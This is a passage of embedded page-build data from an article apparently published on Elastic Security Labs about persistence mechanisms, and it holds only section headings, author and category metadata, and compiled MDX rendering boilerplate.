binaries","href":"#persistence-through-t1554---hijacking-system-binaries"},{"level":3,"title":"Hunting for persistence through T1554 - hijacking system binaries","href":"#hunting-for-persistence-through-t1554---hijacking-system-binaries"},{"level":2,"title":"Conclusion","href":"#conclusion"}],"author":[{"title":"Ruben Groenewoud","slug":"ruben-groenewoud","description":"Security Research Engineer, Elastic","body":{"raw":"","code":"var Component=(()=\u003e{var x=Object.create;var s=Object.defineProperty;var d=Object.getOwnPropertyDescriptor;var g=Object.getOwnPropertyNames;var f=Object.getPrototypeOf,l=Object.prototype.hasOwnProperty;var _=(e,t)=\u003e()=\u003e(t||e((t={exports:{}}).exports,t),t.exports),j=(e,t)=\u003e{for(var n in t)s(e,n,{get:t[n],enumerable:!0})},a=(e,t,n,u)=\u003e{if(t\u0026\u0026typeof t==\"object\"||typeof t==\"function\")for(let o of g(t))!l.call(e,o)\u0026\u0026o!==n\u0026\u0026s(e,o,{get:()=\u003et[o],enumerable:!(u=d(t,o))||u.enumerable});return e};var p=(e,t,n)=\u003e(n=e!=null?x(f(e)):{},a(t||!e||!e.__esModule?s(n,\"default\",{value:e,enumerable:!0}):n,e)),b=e=\u003ea(s({},\"__esModule\",{value:!0}),e);var i=_((D,c)=\u003e{c.exports=_jsx_runtime});var y={};j(y,{default:()=\u003eh,frontmatter:()=\u003ew});var r=p(i()),w={title:\"Ruben Groenewoud\",description:\"Security Research Engineer, Elastic\",slug:\"ruben-groenewoud\"};function m(e){return(0,r.jsx)(r.Fragment,{})}function M(e={}){let{wrapper:t}=e.components||{};return t?(0,r.jsx)(t,Object.assign({},e,{children:(0,r.jsx)(m,e)})):m(e)}var h=M;return b(y);})();\n;return Component;"},"_id":"authors/ruben-groenewoud.mdx","_raw":{"sourceFilePath":"authors/ruben-groenewoud.mdx","sourceFileName":"ruben-groenewoud.mdx","sourceFileDir":"authors","contentType":"mdx","flattenedPath":"authors/ruben-groenewoud"},"type":"Author","imageUrl":"","url":"/authors/ruben-groenewoud"}],"category":[{"title":"Detection science","slug":"detection-science","body":{"raw":"","code":"var Component=(()=\u003e{var x=Object.create;var c=Object.defineProperty;var f=Object.getOwnPropertyDescriptor;var _=Object.getOwnPropertyNames;var d=Object.getPrototypeOf,g=Object.prototype.hasOwnProperty;var j=(t,e)=\u003e()=\u003e(e||t((e={exports:{}}).exports,e),e.exports),l=(t,e)=\u003e{for(var n in e)c(t,n,{get:e[n],enumerable:!0})},i=(t,e,n,s)=\u003e{if(e\u0026\u0026typeof e==\"object\"||typeof e==\"function\")for(let o of _(e))!g.call(t,o)\u0026\u0026o!==n\u0026\u0026c(t,o,{get:()=\u003ee[o],enumerable:!(s=f(e,o))||s.enumerable});return t};var p=(t,e,n)=\u003e(n=t!=null?x(d(t)):{},i(e||!t||!t.__esModule?c(n,\"default\",{value:t,enumerable:!0}):n,t)),D=t=\u003ei(c({},\"__esModule\",{value:!0}),t);var u=j((h,a)=\u003e{a.exports=_jsx_runtime});var X={};l(X,{default:()=\u003eF,frontmatter:()=\u003eM});var r=p(u()),M={title:\"Detection science\",slug:\"detection-science\"};function m(t){return(0,r.jsx)(r.Fragment,{})}function C(t={}){let{wrapper:e}=t.components||{};return e?(0,r.jsx)(e,Object.assign({},t,{children:(0,r.jsx)(m,t)})):m(t)}var F=C;return D(X);})();\n;return Component;"},"_id":"categories/detection-science.mdx","_raw":{"sourceFilePath":"categories/detection-science.mdx","sourceFileName":"detection-science.mdx","sourceFileDir":"categories","contentType":"mdx","flattenedPath":"categories/detection-science"},"type":"Category","url":"/categories/detection-science"}]},"seriesArticles":null},"__N_SSG":true},"page":"/[slug]","query":{"slug":"sequel-on-persistence-mechanisms"},"buildId":"dGrrQfBbQkqaleQ_11aBK","assetPrefix":"/security-labs","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>